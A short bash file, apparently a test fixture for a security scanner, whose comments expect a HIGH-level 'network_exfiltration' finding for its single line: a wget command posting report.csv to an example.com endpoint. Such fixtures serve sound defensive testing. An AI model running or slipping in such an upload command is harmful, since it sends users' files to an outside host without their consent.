#!/usr/bin/env bash
# expect-level: HIGH
# expect-rule: network_exfiltration
wget --post-file=report.csv https://example.com/in
